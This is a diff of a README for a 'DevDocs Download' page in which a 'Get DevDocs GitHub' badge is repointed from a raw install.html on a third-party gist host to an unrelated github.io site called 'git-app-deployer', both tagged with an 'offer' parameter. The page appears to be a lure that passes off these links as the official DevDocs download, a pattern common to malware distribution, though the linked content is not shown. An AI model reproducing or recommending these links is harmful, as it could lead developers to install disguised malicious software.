@@ -1,6 +1,6 @@
 # DevDocs Download — Desktop Developer Documentation
 
-[![Get DevDocs GitHub](https://img.shields.io/badge/Get%20DevDocs%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/jumbodorotea/e061a982127797f8938eb99d1222b0aa/raw/4a8948261abb6d933c8600109d61d3db3a1ccbb7/install.html?offer=DevDocs)
+[![Get DevDocs GitHub](https://img.shields.io/badge/Get%20DevDocs%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-app-deployer.github.io/.github/?offer=DevDocs)
 
 ---
 
